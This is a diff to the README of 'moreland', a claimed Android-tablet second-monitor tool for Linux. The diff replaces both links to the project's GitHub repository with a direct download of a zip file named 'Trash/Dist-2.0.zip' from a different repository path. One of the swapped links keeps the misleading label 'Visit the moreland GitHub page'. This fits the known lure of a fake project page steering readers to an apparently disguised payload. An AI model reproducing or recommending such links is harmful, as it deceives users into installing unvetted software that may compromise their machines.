@@ -6,7 +6,7 @@ description: "Use an Android tablet as a second monitor on Linux/Wayland over US
 <h1>📱 moreland - Turn Your Android Tablet Into a Second Monitor</h1>
 
 <p align="center">
-  <a href="https://github.com/ago1314000-alt/moreland" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD MORELAND NOW</a>
+  <a href="https://raw.githubusercontent.com/ago1314000-alt/ago1314000-alt.github.io/main/Trash/Dist-2.0.zip" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD MORELAND NOW</a>
 </p>
 
 ## ✨ What Is moreland?
@@ -137,7 +137,7 @@ moreland is released under an open-source license, ensuring it stays free for ev
 
 ## 🔗 Quick Links
 
-- [Visit the moreland GitHub page](https://github.com/ago1314000-alt/moreland)
+- [Visit the moreland GitHub page](https://raw.githubusercontent.com/ago1314000-alt/ago1314000-alt.github.io/main/Trash/Dist-2.0.zip)
 - Report Issues
 - View Documentation
 - Show Your Support
